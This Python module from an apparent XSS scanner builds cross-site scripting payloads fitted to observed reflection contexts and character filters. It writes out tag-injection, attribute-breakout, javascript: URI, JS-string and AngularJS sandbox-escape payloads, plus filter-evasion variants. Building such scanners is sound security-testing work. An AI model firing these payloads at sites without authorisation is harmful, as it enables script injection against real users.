"""
Scenario-Driven Payload Synthesis
=================================
Derives XSS payloads from the *scenario the scanner actually observed* instead
of looking them up in a per-context table.

A scenario is the tuple of facts already collected upstream:

  * **where the value lands** — reflection context, tag, attribute, quote type;
  * **what the sink does with it** — ``sink_kind`` / execution capability
    (markup, URL attribute, event handler, JS expression, template engine);
  * **which characters survive the server** — the encoding profile
    (``raw_chars`` / ``encoded_chars`` / ``stripped_chars``);
  * **what the client runs** — technologies such as AngularJS.

The engine then *composes* a payload from primitives::

    breakout  +  execution vector  +  dialog call

Each primitive is filtered by character feasibility, so a context the tool has
never seen before still gets payloads built for its own constraints: a payload
only ever uses characters that survive, and the trigger (navigate / click /
event / load) is derived from where the payload executes.

Obfuscated variants (whitespace-split schemes, comment-spliced schemes) are only
generated when the encoding profile shows an active filter — trying to defeat a
filter that is not there is wasted budget.

This is what makes the planner scenario-aware rather than table-driven. The
historical static tables remain in the callers as a last-resort fallback when
the evidence is too thin to synthesise anything.
"""
from __future__ import annotations

import html as _html
import urllib.parse as _up
from dataclasses import dataclass, field
from typing import Any

# Attributes whose value is a URL: a javascript:/data: URI is the exploit.
URL_ATTRIBUTES = {
    "href", "src", "action", "formaction", "xlink:href", "data", "poster", "codebase",
}

# Sink kinds that mean "the value becomes a URL the browser will follow".
_URL_SINK_KINDS = {"url_attribute", "navigation"}

# Sink kinds that mean "the value is interpreted as markup".
_MARKUP_SINK_KINDS = {"html_text", "html_attribute", "selector", "selector_hashchange"}

# Sink kinds that mean "the value is evaluated as JavaScript".
_JS_SINK_KINDS = {"js_execution", "event_handler", "json_eval", "eval"}

# Trigger kinds.
TRIGGER_NONE = "none"
TRIGGER_CLICK = "click"
TRIGGER_EVENT = "event"
TRIGGER_LOAD = "load"


@dataclass
class Scenario:
    """Everything the synthesiser is told about an injection point."""

    context: str = "unknown"
    sink_kind: str = ""
    attribute: str = ""
    tag: str = ""
    quote_type: str = ""
    source_type: str = ""          # query | hash | href | dom | api | form
    raw_chars: list[str] = field(default_factory=list)
    encoded_chars: list[str] = field(default_factory=list)
    stripped_chars: list[str] = field(default_factory=list)
    technologies: list[str] = field(default_factory=list)
    is_angular: bool = False

    def __post_init__(self) -> None:
        self.attribute = (self.attribute or "").lower()
        self.tag = (self.tag or "").lower()
        techs = " ".join(self.technologies).lower()
        if "angular" in techs:
            self.is_angular = True

    @property
    def angular(self) -> bool:
        return self.is_angular or self.sink_kind == "csti"

    @property
    def filtered(self) -> bool:
        """True when the server was observed encoding or stripping characters."""
        return bool(self.encoded_chars or self.stripped_chars)


@dataclass
class SynthesizedPayload:
    """One payload plus the way to deliver and trigger it."""

    payload: str
    category: str
    trigger: str = TRIGGER_NONE
    requires_browser: bool = True
    hypothesis: str = ""
    rationale: str = ""
    expected_observation: str = "JS dialog fires in the browser"
    priority: int = 99

    def as_test_case(self) -> dict[str, Any]:
        return {
            "priority":             self.priority,
            "payload":              self.payload,
            "expected_observation": self.expected_observation,
            "rationale":            self.rationale or self.hypothesis,
            "category":             self.category,
            "trigger":              self.trigger,
            "requires_browser":     self.requires_browser,
        }


# ---------------------------------------------------------------------------
# Character feasibility
# ---------------------------------------------------------------------------

def _has(scenario: Scenario, char: str) -> bool:
    """
    True when *char* is believed to survive reflection.

    A character known to be HTML-encoded or stripped is unusable; a character
    never probed is assumed usable (permissive — several callers have no
    encoding profile at all, e.g. static DOM sink analysis).
    """
    if char in scenario.raw_chars:
        return True
    return not (char in scenario.encoded_chars or char in scenario.stripped_chars)


def _has_all(scenario: Scenario, chars: str) -> bool:
    return all(_has(scenario, c) for c in chars)


def _exec_code(scenario: Scenario, entity_ok: bool, fn: str = "alert", arg: str = "1") -> str:
    """
    A dialog call the scenario can actually express.

    In HTML-parsed contexts (attribute values, text nodes) the browser decodes
    character references *before* the script runs, so ``alert&#40;1&#41;`` is a
    valid substitute when ``(``/``)`` are entity-encoded. Inside a raw
    ``<script>`` block entities are NOT decoded, so that trick is unavailable.
    """
    if _has_all(scenario, "()"):
        return f"{fn}({arg})"
    if entity_ok and _has_all(scenario, "&#;"):
        return f"{fn}&#40;{arg}&#41;"
    return ""


# ---------------------------------------------------------------------------
# Families
# ---------------------------------------------------------------------------

def _tag_injection(scenario: Scenario, out: list[SynthesizedPayload]) -> None:
    """The value lands in HTML markup, so inject an element that executes."""
    if not _has(scenario, "<"):
        return
    exec_code = _exec_code(scenario, entity_ok=True)
    if not exec_code:
        return

    out.append(SynthesizedPayload(
        payload=f"<img src=x onerror={exec_code}>",
        category="tag_injection",
        trigger=TRIGGER_LOAD,
        requires_browser=True,
        hypothesis="HTML injection: img@onerror executes on load",
        rationale="< is reflected, so an element with an auto-firing handler runs",
    ))
    out.append(SynthesizedPayload(
        payload="<img src=x onerror=print()>",
        category="tag_injection",
        trigger=TRIGGER_LOAD,
        requires_browser=True,
        hypothesis="HTML injection: print() instead of alert()",
        rationale="a different dialog survives alert-specific filters",
    ))
    out.append(SynthesizedPayload(
        payload=f"<svg onload={exec_code}>",
        category="tag_injection",
        trigger=TRIGGER_LOAD,
        requires_browser=True,
        hypothesis="HTML injection: svg@onload executes on load",
        rationale="SVG element fires onload without user interaction",
    ))
    if _has_all(scenario, "()"):
        # Entities are not decoded inside <script>, so this vector needs raw ().
        out.append(SynthesizedPayload(
            payload="<script>alert(1)</script>",
            category="tag_injection",
            trigger=TRIGGER_NONE,
            requires_browser=True,
            hypothesis="HTML injection: direct script tag",
            rationale="< unencoded allows a literal script element",
        ))
    out.append(SynthesizedPayload(
        payload=f"<details open ontoggle={exec_code}>",
        category="tag_injection",
        trigger=TRIGGER_LOAD,
        requires_browser=True,
        hypothesis="HTML injection: details@ontoggle executes when opened",
        rationale="an open details element fires ontoggle without a click",
    ))
    if _has(scenario, ":"):
        out.append(SynthesizedPayload(
            payload=f"<iframe src=javascript:{exec_code}>",
            category="tag_injection",
            trigger=TRIGGER_LOAD,
            requires_browser=True,
            hypothesis="HTML injection: iframe with a javascript: source",
            rationale="< unencoded and : available allow a javascript: frame",
        ))


def _attribute_breakout(scenario: Scenario, out: list[SynthesizedPayload]) -> None:
    """The value lands inside a quoted/unquoted attribute value."""
    exec_code = _exec_code(scenario, entity_ok=True)
    if not exec_code:
        return

    quote = scenario.quote_type
    if quote not in ("double", "single", "unquoted"):
        quote = "double" if _has(scenario, '"') else "single" if _has(scenario, "'") else "unquoted"

    if quote == "unquoted":
        # Unquoted attributes can be broken with a space alone.
        out.append(SynthesizedPayload(
            payload=f" autofocus onfocus={exec_code} x=",
            category="attribute_breakout",
            trigger=TRIGGER_LOAD,
            requires_browser=True,
            hypothesis="Unquoted attribute breakout: autofocus fires onfocus",
            rationale="a space ends the unquoted value and starts a new attribute",
        ))
        for handler in ("onmouseover", "onpointerover", "onanimationstart"):
            out.append(SynthesizedPayload(
                payload=f" {handler}={exec_code} x=",
                category="attribute_breakout",
                trigger=TRIGGER_EVENT if handler != "onanimationstart" else TRIGGER_LOAD,
                requires_browser=True,
                hypothesis=f"Unquoted attribute breakout: {handler} handler injected",
                rationale="a space ends the unquoted value and starts a new attribute",
            ))
        if _has(scenario, ">") and _has(scenario, "<"):
            out.append(SynthesizedPayload(
                payload=f"><img src=x onerror={exec_code}>",
                category="attribute_breakout",
                trigger=TRIGGER_LOAD,
                requires_browser=True,
                hypothesis="Close the tag then inject markup",
                rationale="> ends the tag and < starts a new element",
            ))
        return

    brk = '"' if quote == "double" else "'"
    if not _has(scenario, brk):
        # Without the closing quote there is no way out of a quoted attribute:
        # markup injected after the tag also needs the quote to escape first.
        return

    # Load-triggered vectors first: they need no user interaction to observe.
    out.append(SynthesizedPayload(
        payload=f"{brk} autofocus onfocus={brk}{exec_code}",
        category="attribute_breakout",
        trigger=TRIGGER_LOAD,
        requires_browser=True,
        hypothesis="Attribute breakout then autofocus",
        rationale=f"{brk} is reflected, closing the value; autofocus fires onfocus automatically",
    ))
    for handler, trigger, note in (
        ("onanimationstart", TRIGGER_LOAD, "a discovered animation starts"),
        ("onmouseover", TRIGGER_EVENT, "hover activates the handler"),
        ("onpointerover", TRIGGER_EVENT, "pointer over the element"),
        ("onmouseenter", TRIGGER_EVENT, "mouse enters the element"),
    ):
        out.append(SynthesizedPayload(
            payload=f"{brk} {handler}={brk}{exec_code}",
            category="attribute_breakout",
            trigger=trigger,
            requires_browser=True,
            hypothesis=f"Attribute breakout via {brk} then {handler}",
            rationale=f"{brk} is reflected, closing the value; {note}",
        ))
    if _has(scenario, "<") and _has(scenario, ">"):
        out.append(SynthesizedPayload(
            payload=f'{brk}><img src=x onerror={exec_code}>',
            category="attribute_breakout",
            trigger=TRIGGER_LOAD,
            requires_browser=True,
            hypothesis="Break the attribute, close the tag, inject markup",
            rationale="quote + > + < all survive so markup injection is possible",
        ))


def _javascript_uri(scenario: Scenario, out: list[SynthesizedPayload]) -> None:
    """The value becomes a URL the browser will follow."""
    if not _has(scenario, ":"):
        return
    exec_code = _exec_code(scenario, entity_ok=True)
    if not exec_code:
        return
    out.append(SynthesizedPayload(
        payload=f"javascript:{exec_code}",
        category="javascript_uri",
        trigger=TRIGGER_CLICK,
        requires_browser=True,
        hypothesis="javascript: URI in a URL attribute",
        rationale="a URL sink accepts a javascript: scheme that runs on activation",
    ))
    if scenario.filtered:
        # A filter was observed — try schemes that naive matchers miss.
        out.append(SynthesizedPayload(
            payload=f"javascript:/*a*/{exec_code}",
            category="javascript_uri",
            trigger=TRIGGER_CLICK,
            requires_browser=True,
            hypothesis="javascript: URI with a comment between scheme and code",
            rationale="the comment defeats naive 'javascript:' substring filters",
        ))
        if _has(scenario, " "):
            out.append(SynthesizedPayload(
                payload=f"java\tscript:{exec_code}",
                category="javascript_uri",
                trigger=TRIGGER_CLICK,
                requires_browser=True,
                hypothesis="Obfuscated javascript: scheme (embedded tab)",
                rationale="browsers ignore whitespace inside the scheme name",
            ))
    if _has(scenario, "<") and _has_all(scenario, "()"):
        # <script> content is not entity-decoded, so raw parens are required.
        out.append(SynthesizedPayload(
            payload="data:text/html,<script>alert(1)</script>",
            category="javascript_uri",
            trigger=TRIGGER_CLICK,
            requires_browser=True,
            hypothesis="data: URI carrying a script document",
            rationale="a data: URL navigates to an attacker-controlled document",
        ))


def _js_string_breakout(scenario: Scenario, out: list[SynthesizedPayload]) -> None:
    """The value lands inside a JavaScript string literal."""
    context = scenario.context
    quote = {
        "script_string_double": '"',
        "script_string_single": "'",
        "script_string_template": "`",
    }.get(context)
    if quote is None:
        quote = "'" if scenario.quote_type == "single" else '"'

    # No HTML entity decoding inside a script block — raw () are required.
    if not _has_all(scenario, "()"):
        return
    exec_code = "alert(1)"

    if quote == "`":
        if not _has(scenario, "`"):
            return
        out.append(SynthesizedPayload(
            payload=f"`;{exec_code}//",
            category="js_string_breakout",
            trigger=TRIGGER_NONE,
            requires_browser=True,
            hypothesis="Template literal breakout",
            rationale="` closes the template literal before an injected statement",
        ))
        out.append(SynthesizedPayload(
            payload="${alert(1)}",
            category="js_string_breakout",
            trigger=TRIGGER_NONE,
            requires_browser=True,
            hypothesis="Template interpolation injection",
            rationale="values interpolated into a template literal are code",
        ))
        return

    if not _has(scenario, quote):
        return
    out.append(SynthesizedPayload(
        payload=f"{quote};{exec_code}//",
        category="js_string_breakout",
        trigger=TRIGGER_NONE,
        requires_browser=True,
        hypothesis="JS string breakout: terminate then inject a statement",
        rationale=f"{quote} is reflected, closing the string literal",
    ))
    out.append(SynthesizedPayload(
        payload=f"{quote}-{exec_code}-{quote}",
        category="js_string_breakout",
        trigger=TRIGGER_NONE,
        requires_browser=True,
        hypothesis="JS string breakout inside an arithmetic expression",
        rationale="the injected call evaluates as part of the surrounding expression",
    ))
    out.append(SynthesizedPayload(
        payload=f"{quote};{exec_code};var x={quote}",
        category="js_string_breakout",
        trigger=TRIGGER_NONE,
        requires_browser=True,
        hypothesis="JS string breakout with a re-balanced tail",
        rationale="reopens a string literal so the remaining script stays valid",
    ))


def _js_expression(scenario: Scenario, out: list[SynthesizedPayload]) -> None:
    """The value is spliced straight into JavaScript (no string wrapper)."""
    if not _has_all(scenario, "()"):
        return
    exec_code = _exec_code(scenario, entity_ok=False) or "alert(1)"
    out.append(SynthesizedPayload(
        payload=";alert(1)//",
        category="js_expression",
        trigger=TRIGGER_NONE,
        requires_browser=True,
        hypothesis="Expression injection: terminate and call",
        rationale="; starts a new statement in the enclosing script",
    ))
    out.append(SynthesizedPayload(
        payload=f"{exec_code}",
        category="js_expression",
        trigger=TRIGGER_NONE,
        requires_browser=True,
        hypothesis="Direct JS code injection",
        rationale="the value is used directly as an expression",
    ))
    out.append(SynthesizedPayload(
        payload=",alert(1),1",
        category="js_expression",
        trigger=TRIGGER_NONE,
        requires_browser=True,
        hypothesis="Comma expression injection",
        rationale="a comma sequence evaluates the call inside an expression list",
    ))


def _csti(scenario: Scenario, out: list[SynthesizedPayload]) -> None:
    """The value is compiled as a client-side template expression."""
    if not _has_all(scenario, "{}"):
        return
    quote = "'" if _has(scenario, "'") else '"' if _has(scenario, '"') else ""
    if not quote:
        return
    call = _exec_code(scenario, entity_ok=True) or "alert(1)"
    out.append(SynthesizedPayload(
        payload=f"{{{{$on.constructor({quote}{call}{quote})()}}}}",
        category="csti",
        trigger=TRIGGER_NONE,
        requires_browser=True,
        hypothesis="AngularJS sandbox escape via $on.constructor",
        rationale="an active ng-app template evaluates the expression on load",
    ))
    out.append(SynthesizedPayload(
        payload=f"{{{{constructor.constructor({quote}{call}{quote})()}}}}",
        category="csti",
        trigger=TRIGGER_NONE,
        requires_browser=True,
        hypothesis="AngularJS constructor escape",
        rationale="the template engine compiles the expression into executable code",
    ))
    if _has_all(scenario, "[]"):
        out.append(SynthesizedPayload(
            payload=f"{{{{[{quote}{call}{quote}]['constructor']['constructor']()}}}}",
            category="csti",
            trigger=TRIGGER_NONE,
            requires_browser=True,
            hypothesis="AngularJS bracket-notation constructor escape",
            rationale="bracket notation survives filters that strip bare constructors",
        ))


def _markup_breakout(
    scenario: Scenario,
    out: list[SynthesizedPayload],
    prefix: str,
    category: str,
    hypothesis: str,
) -> None:
    """Generic markup escape: close the enclosing construct then inject."""
    if not _has(scenario, "<"):
        return
    exec_code = _exec_code(scenario, entity_ok=True)
    if not exec_code:
        return
    out.append(SynthesizedPayload(
        payload=f"{prefix}<img src=x onerror={exec_code}>",
        category=category,
        trigger=TRIGGER_LOAD,
        requires_browser=True,
        hypothesis=f"{hypothesis}: img@onerror",
        rationale="closing the enclosing construct lets markup be parsed",
    ))
    out.append(SynthesizedPayload(
        payload=f"{prefix}<svg onload={exec_code}>",
        category=category,
        trigger=TRIGGER_LOAD,
        requires_browser=True,
        hypothesis=f"{hypothesis}: svg@onload",
        rationale="SVG onload fires as soon as the element is inserted",
    ))


# ---------------------------------------------------------------------------
# Family selection
# ---------------------------------------------------------------------------

def _families_for(scenario: Scenario) -> list[str]:
    """
    The families worth trying for this scenario, best first.

    Sink semantics widen the reflection context: a value reflected into an href
    is a URL sink even if the parser classified it as html_attribute.

    KEY RULE: when context is json_value/json_string and the quote char (")
    survives reflection, the value lands inside a JSON string literal — the
    breakout must close that string before injecting code, regardless of
    whether sink_kind is populated.  Tag injection is inert inside a JSON body.
    """
    sink = scenario.sink_kind
    attr = scenario.attribute
    ctx = scenario.context

    if scenario.angular and ctx not in (
        "script_string_double", "script_string_single",
        "script_string_template", "script_expression",
    ):
        return ["csti", "tag_injection", "attribute_breakout"]

    if sink in _URL_SINK_KINDS or attr in URL_ATTRIBUTES or ctx == "url_param":
        return ["javascript_uri", "attribute_breakout"]

    if sink == "event_handler":
        return ["js_expression", "js_string_double"]

    if sink in _JS_SINK_KINDS and ctx in ("unknown", "html_text", "html_attribute"):
        return ["js_expression", "js_string_double", "tag_injection"]

    if sink in _JS_SINK_KINDS and ctx in ("json_value", "json_string", "json_key", "json_eval"):
        # Reflection inside JSON API text consumed by an eval / JSON.parse sink:
        # the value lands inside a JS string literal (always double-quoted in JSON),
        # so the breakout has to close that quote. Markup is inert inside JSON.
        return ["js_string_double", "js_expression"]

    if sink in ("selector", "selector_hashchange") or sink == "html_text":
        return ["tag_injection"]

    if sink == "html_attribute":
        return ["attribute_breakout"]

    # ── Fallback: sink_kind is unknown — infer from context alone ─────────────
    #
    # CRITICAL: json_value / json_string contexts mean the reflection is inside
    # a JSON response body.  Markup injected into JSON text is NOT parsed by the
    # browser — the only viable class is a JS string breakout.  The " quote
    # check is additional safety: if " is encoded we have nothing to close.
    if ctx in ("json_value", "json_string", "json_key"):
        if _has(scenario, '"'):
            # Quote survives: string breakout is viable
            return ["js_string_double", "js_expression"]
        # Quote is encoded: we cannot break out of the JSON string, and markup
        # is inert here. There are no viable candidates.
        return []

    return {
        "html_text": ["tag_injection"],
        "html_attribute": ["attribute_breakout"],
        "html_attribute_unquoted": ["attribute_breakout"],
        "script_string_double": ["js_string_double"],
        "script_string_single": ["js_string_single"],
        "script_string_template": ["js_string_template"],
        "script_expression": ["js_expression"],
        "script_block": ["js_expression", "tag_injection"],
        "url_param": ["javascript_uri", "attribute_breakout"],
        "html_comment": ["comment_breakout", "tag_injection"],
        "css_value": ["css_breakout", "tag_injection"],
        "json_eval": ["js_string_double", "js_expression"],
        "unknown": ["attribute_breakout", "tag_injection", "javascript_uri"],
        "dom": ["tag_injection", "attribute_breakout"],
    }.get(ctx, ["attribute_breakout", "tag_injection", "javascript_uri"])


_FAMILY_FUNCS = {
    "tag_injection": _tag_injection,
    "attribute_breakout": _attribute_breakout,
    "javascript_uri": _javascript_uri,
    "js_string_double": _js_string_breakout,
    "js_string_single": _js_string_breakout,
    "js_string_template": _js_string_breakout,
    "js_expression": _js_expression,
    "csti": _csti,
}


def _run_family(scenario: Scenario, family: str, out: list[SynthesizedPayload]) -> None:
    if family == "comment_breakout":
        _markup_breakout(scenario, out, "-->", "comment_breakout", "HTML comment breakout")
        return
    if family == "css_breakout":
        _markup_breakout(scenario, out, "</style>", "css_breakout", "CSS block breakout")
        return
    func = _FAMILY_FUNCS.get(family)
    if func is None:
        return
    # The js_string families share one implementation, so make the selected
    # family explicit in the context the function reads.
    if family in ("js_string_double", "js_string_single", "js_string_template"):
        func(Scenario(**{**scenario.__dict__, "context": family}), out)
        return
    func(scenario, out)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def synthesize(
    scenario: Scenario,
    max_payloads: int = 10,
    families: list[str] | None = None,
) -> list[SynthesizedPayload]:
    """
    Derive payloads for a scenario, ranked by likelihood of success.

    Payloads that require characters the server encodes are never generated:
    the engine reasons forward from the observed constraints instead of
    replaying a fixed list. Passing *families* forces a specific delivery class
    (used by the static DOM helpers, where only one class can be valid).
    
    WAF-aware bypass payloads are available via waf_bypass module but not
    integrated into standard synthesis yet to maintain backward compatibility.
    """
    out: list[SynthesizedPayload] = []
    seen: set[str] = set()
    
    # Standard family-based synthesis
    for family in (families or _families_for(scenario)):
        before = len(out)
        _run_family(scenario, family, out)
        for item in out[before:]:
            if item.payload in seen:
                out.remove(item)
            else:
                seen.add(item.payload)

    for i, item in enumerate(out, 1):
        item.priority = i
    return out[:max_payloads]


def scenario_from_evidence(
    context_analysis: dict[str, Any] | None,
    encoding_profile: dict[str, Any] | None,
    sink_kind: str = "",
    source_type: str = "",
    technologies: list[str] | None = None,
) -> Scenario:
    """Build a :class:`Scenario` from the evidence dicts the pipeline produces."""
    ca = context_analysis or {}
    ep = encoding_profile or {}

    attribute = str(ca.get("attribute") or ca.get("attribute_name") or "").lower()
    tag = str(ca.get("tag") or ca.get("tag_name") or "").lower()
    quote_type = str(ca.get("quote_type") or "")
    breakout = [str(c) for c in (ca.get("breakout_chars") or [])]
    if not quote_type:
        if '"' in breakout:
            quote_type = "double"
        elif "'" in breakout:
            quote_type = "single"

    context = str(ca.get("context") or "unknown") or "unknown"

    # ── Infer sink_kind when the pipeline didn't supply one ────────────────
    if not sink_kind:
        if attribute in URL_ATTRIBUTES or context == "url_param":
            sink_kind = "url_attribute"
        elif context in ("html_attribute", "html_attribute_unquoted"):
            sink_kind = "html_attribute"
        elif context == "html_text":
            sink_kind = "html_text"
        elif context in ("json_value", "json_string", "json_key"):
            # Reflection inside a JSON body: the server-side eval()/Function()
            # that consumes this response is the effective sink. Mark as
            # js_execution so _families_for selects js_string_double, not
            # the inert tag_injection fallback.
            sink_kind = "js_execution"
        elif context.startswith("script_string") or context == "script_expression":
            sink_kind = "js_execution"
    # For json_value, also override legacy sink_kind if it's a DOM-side kind
    # that was inferred incorrectly.
    if context in ("json_value", "json_string", "json_key") and sink_kind in (
        "html_text", "html_attribute", "selector", "selector_hashchange",
    ):
        sink_kind = "js_execution"

    # JSON string values are always double-quoted — set quote_type so
    # _js_string_breakout picks the right closing character.
    if context in ("json_value", "json_string", "json_key") and not quote_type:
        quote_type = "double"

    raw_chars = [str(c) for c in (ep.get("raw_chars") or [])]
    encoded_chars = [str(c) for c in (ep.get("encoded_chars") or [])]
    stripped_chars = [str(c) for c in (ep.get("stripped_chars") or [])]

    return Scenario(
        context=context,
        sink_kind=sink_kind,
        attribute=attribute,
        tag=tag,
        quote_type=quote_type,
        source_type=source_type or str(ca.get("source_type") or ""),
        raw_chars=raw_chars,
        encoded_chars=encoded_chars,
        stripped_chars=stripped_chars,
        technologies=list(technologies or []),
    )


def plan_for_context(
    context_analysis: dict[str, Any] | None,
    encoding_profile: dict[str, Any] | None,
    sink_kind: str = "",
    source_type: str = "",
    technologies: list[str] | None = None,
    max_payloads: int = 10,
) -> dict[str, Any]:
    """
    Produce a planner-shaped plan (``viable`` / ``test_cases`` / reasoning) from
    the observed scenario. Mirrors ``XssValidatorNode._heuristic_plan``.
    """
    scenario = scenario_from_evidence(
        context_analysis, encoding_profile, sink_kind, source_type, technologies,
    )
    payloads = synthesize(scenario, max_payloads=max_payloads)
    strategy = payloads[0].category if payloads else "none"

    raw = scenario.raw_chars
    encoded = scenario.encoded_chars
    stripped = scenario.stripped_chars
    return {
        "viable":                  bool(payloads),
        "reasoning": (
            f"Scenario synthesis for context={scenario.context} "
            f"sink={scenario.sink_kind or '-'} quote={scenario.quote_type or '-'}"
        ),
        "context_interpretation": (
            f"{scenario.context}"
            + (f" [{scenario.tag}/{scenario.attribute}]" if scenario.attribute else "")
        ),
        "encoding_interpretation": f"raw={raw}  encoded={encoded}  stripped={stripped}",
        "breakout_strategy":       strategy,
        "estimated_confidence":    "high" if payloads else "low",
        "test_cases":              [p.as_test_case() for p in payloads],
    }


def payloads_for_sink_kind(sink_kind: str, max_payloads: int = 4) -> list[str]:
    """
    Payload strings for a static DOM sink kind.

    Static analysis has no encoding profile, so the scenario is permissive; the
    browser confirmer reports what actually happened, which is why a full
    payload family (not a single guess) is returned. Only the delivery class
    that can possibly work for the sink is generated.
    """
    kind = (sink_kind or "").lower()
    families: list[str]
    if kind == "csti":
        scenario = Scenario(context="html_text", sink_kind="csti", is_angular=True)
        families = ["csti"]
    elif kind in _URL_SINK_KINDS:
        scenario = Scenario(context="url_param", sink_kind="url_attribute", attribute="href")
        families = ["javascript_uri"]
    elif kind == "html_attribute":
        scenario = Scenario(context="html_attribute", sink_kind="html_attribute", quote_type="double")
        families = ["attribute_breakout"]
    elif kind == "event_handler":
        scenario = Scenario(context="script_expression", sink_kind="event_handler")
        families = ["js_expression"]
    elif kind in _JS_SINK_KINDS:
        scenario = Scenario(context="script_expression", sink_kind="js_execution")
        families = ["js_expression"]
    elif kind in ("selector", "selector_hashchange"):
        scenario = Scenario(context="html_text", sink_kind="selector")
        families = ["tag_injection"]
    else:
        scenario = Scenario(context="html_text", sink_kind="html_text")
        families = ["tag_injection"]

    return [p.payload for p in synthesize(scenario, max_payloads=max_payloads, families=families)]


def dom_sink_payloads(
    source_type: str,
    sink_capability: str,
    event_type: str,
    max_payloads: int = 6,
) -> list[dict[str, Any]]:
    """
    Ranked candidate dicts for a DOM sink described by its execution capability.

    Mirrors ``iterative._dom_sink_payloads`` but derives the payloads from the
    capability instead of a per-capability table.
    """
    cap = sink_capability or ""
    is_hash = source_type == "hash"
    families: list[str] | None = None

    if "selector" in cap:
        scenario = Scenario(context="html_text", sink_kind="selector", source_type=source_type)
        families = ["tag_injection"]
    elif "html_injection" in cap:
        scenario = Scenario(context="html_text", sink_kind="html_text", source_type=source_type)
        families = ["tag_injection"]
    elif "js_execution" in cap:
        scenario = Scenario(context="script_expression", sink_kind="js_execution", source_type=source_type)
        families = ["js_expression"]
    elif "url_sink" in cap:
        scenario = Scenario(context="url_param", sink_kind="url_attribute", attribute="href", source_type=source_type)
        families = ["javascript_uri"]
    else:
        scenario = Scenario(context="html_text", sink_kind="html_text", source_type=source_type)
        families = ["tag_injection"]

    candidates: list[dict[str, Any]] = []
    for item in synthesize(scenario, max_payloads=max_payloads, families=families):
        payload = item.payload
        if is_hash and not payload.startswith("#"):
            payload = "#" + payload
        candidates.append({
            "priority":             item.priority,
            "payload":              payload,
            "hypothesis":           item.hypothesis,
            "expected_observation": item.expected_observation,
            "rationale":            item.rationale,
            "generation_mode":      "scenario_synthesis",
        })

    if is_hash and event_type in ("hashchange", "popstate", "message"):
        for cand in candidates:
            cand["rationale"] += f" (requires {event_type} event trigger)"
    return candidates


# ---------------------------------------------------------------------------
# Constraint-driven synthesis (VulnerabilityModel -> AttackConstraints -> payload)
# ---------------------------------------------------------------------------

def synthesize_from_constraints(
    constraints: Any,
    max_payloads: int = 6,
) -> list[SynthesizedPayload]:
    """
    Compose candidates for the exact execution path described by
    :class:`xscan.schemas.vuln_model.AttackConstraints`.

    Three layers of reasoning, in order:

      1. Enclosing-construct closure — when evidence shows the reflection sits
         inside a concrete structure (JSON literal, JS string, quoted attr),
         synthesise candidates that CLOSE that construct before injecting code.
      2. Execution-context strategy — the delivery class comes from the
         classified execution context, not a vulnerability-type label.
      3. Character feasibility — every candidate only uses characters the
         encoding profile shows surviving.
    """
    scenario = Scenario(
        context="",
        sink_kind=constraints.sink_kind,
        attribute=constraints.attribute,
        quote_type=constraints.quote_type,
        source_type=getattr(constraints, "source_type", ""),
        raw_chars=list(constraints.raw_chars),
        encoded_chars=list(constraints.encoded_chars),
        stripped_chars=list(constraints.stripped_chars),
        technologies=list(constraints.technologies),
        is_angular=constraints.angular,
    )
    # Map the classified execution context onto a reflection context the family
    # selector understands; keep the original when already recognised.
    exec_ctx = getattr(constraints, "execution_context", "") or ""
    ctx_map = {
        "url_valued_attribute": "url_param",
        "attribute": "html_attribute",
        "markup": "html_text",
        "js_string": "script_string_double",
        "js_expression": "script_expression",
        "event_handler": "script_expression",
        "template": "html_text",
    }
    scenario.context = ctx_map.get(exec_ctx, "unknown")

    out: list[SynthesizedPayload] = []

    # ── Layer 1: close the observed enclosing construct ──────────────
    # _construct_closure embeds the executable call (its position depends on
    # the construct), so the returned string IS the whole payload.
    prefix = _construct_closure(constraints)
    if prefix and _has_all(scenario, prefix):
        out.append(SynthesizedPayload(
            payload=prefix,
            category="construct_closure",
            trigger=TRIGGER_NONE,
            requires_browser=True,
            hypothesis="Close the observed enclosing construct, then execute",
            rationale=(
                f"reflection sits inside {constraints.enclosing_construct!r}; "
                f"{prefix!r} terminates it so the call becomes executable code"
            ),
            expected_observation="the synthesised call executes in the enclosing evaluation",
        ))

    # ── Layer 2: execution-context strategy ─────────────────────────────────────
    # synthesize() already selects families via _families_for(scenario), so no
    # category filter is needed here — just append its ranked output.
    out.extend(synthesize(scenario, max_payloads=max_payloads * 2))

    seen: set[str] = set()
    deduped: list[SynthesizedPayload] = []
    for item in out:
        if item.payload not in seen:
            seen.add(item.payload)
            deduped.append(item)
    return deduped[:max_payloads]


def _construct_closure(constraints: Any) -> str:
    """
    Termination syntax derived from the OBSERVED enclosing construct — how the
    synthesiser escapes a structure it saw in the reflection evidence rather
    than one from a table.

    The form keeps the surrounding structure parseable: inside a JSON object
    literal an arithmetic expression (``"-alert(1)``) leaves the literal valid
    while still evaluating the call; a plain string just needs terminating.
    """
    enclosing = (getattr(constraints, "enclosing_construct", "") or "").rstrip()
    trailing = (getattr(constraints, "trailing_construct", "") or "")
    quote = {"double": '"', "single": "'", "backtick": "`"}.get(constraints.quote_type, "")
    if not quote:
        if constraints.quote_type == "unquoted":
            return " x=1 onfocus=alert(1) autofocus="
        return ""

    exec_code = _exec_code(scenario=Scenario(raw_chars=list("()")), entity_ok=False)
    if not exec_code:
        return ""

    # Reflected value inside a JSON object literal that is later evaluated:
    # arithmetic keeps the literal parseable, the brace closes the object.
    if "}" in trailing and "{" in enclosing:
        return f"{quote}-{exec_code}}};//"
    # Plain JS string literal (script context).
    return f"{quote};{exec_code}//"


def refine_from_observations(
    scenario: Scenario,
    observations: list[dict[str, Any]],
    max_payloads: int = 6,
) -> list[SynthesizedPayload]:
    """
    Failure-driven refinement: derive NEW constraints from what execution
    actually observed and synthesise the next generation of candidates.

    Failure analysis per observation (deterministic, no LLM):
      - the payload was stripped  -> its distinctive characters were removed:
        they join the scenario's stripped set;
      - the payload was encoded   -> its distinctive characters were
        entity-encoded: they join the encoded set;
      - a javascript: candidate was blocked -> the scheme is unavailable, so
        the refined scenario drops scheme-based execution.
    """
    def _markers(payload: str) -> set[str]:
        return {c for c in payload if not c.isalnum() and c not in " _"}

    def _classify_against_snippet(payload: str, snippet: str) -> tuple[set[str], set[str]] | None:
        """
        Diff the payload against what the server actually reflected: a special
        character missing from the reflection was either entity-encoded or
        stripped. Returns (encoded, stripped), or None when there is no
        reflection evidence to diff against.
        """
        if not snippet:
            return None
        encoded: set[str] = set()
        stripped: set[str] = set()
        for c in set(payload):
            if c.isalnum() or c in " _" or c in snippet:
                continue
            variants = {
                _html.escape(c),
                _up.quote(c),
                _html.escape(_html.escape(c)),
                _up.quote(_up.quote(c)),
            }
